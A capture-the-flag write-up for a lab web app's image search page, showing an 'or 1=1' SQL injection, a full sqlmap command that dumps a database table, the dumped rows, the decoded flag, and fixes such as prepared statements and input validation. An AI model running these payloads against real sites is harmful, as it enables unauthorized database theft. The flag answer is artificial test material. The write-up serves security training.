# SQL injection advanced
[http://10.203.72.119/index.php?page=searchimg](http://10.203.72.119/index.php?page=searchimg "image search") this page is also vunreable to ***sql injection***

## Method
If we insert ***1 or 1=1*** in the search text box we get back results of all the users in the database table.

We can then use ***sqlmap*** to get the database, tables and the columns.
With this command we will dump the ***list_images*** table from the ***Member_images*** database. 

``` bash
sqlmap -u 'http://10.203.72.119/index.php?page=searchimg&id=1&Submit=Submit#' -D Member_images -T list_images --dump
```
The results
```bash
Database: Member_images
Table: list_images
[6 entries]
+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
| id | url                              | title     | comment                                                                                                               |
+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
| 1  | https://www.nsa.org/img.jpg      | Nsa       | An image about the NSA !                                                                                              |
| 2  | https://www.42.fr/42.png         | 42 !      | There is a number..                                                                                                   |
| 3  | https://www.google.fr/google.png | Google    | Google it !                                                                                                           |
| 4  | https://www.obama.org/obama.jpg  | Obama     | Yes we can !                                                                                                          |
| 5  | borntosec.ddns.net/images.png    | Hack me ? | If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 |
| 6  | https://www.h4x0r3.0rg/tr0ll.png | tr00l     | Because why not ?                                                                                                     |
+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
```
Then on the 5th row we see that we are given a flag, that we need to decode from ***md5***, then sha256. The flag after the process will be ***f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188***

## Solution 
1. Using prepared statements given that this site uses ***PHP***, prepared help the database distinguish between the ***code*** and ***user input***, by pre-compliling ***SQL*** statements to be then used as input. For ***PHP*** using ***PDO*** is one of the solutions.
1. Validating input, making use of ***regular expression*** to validate thee user input whether it matches the expected input, checking whether it contains special charcters, which would be incorrect if the input is to be a surname or name. This process can be called ***sanitization***.
1. ***Backend*** validation is very important.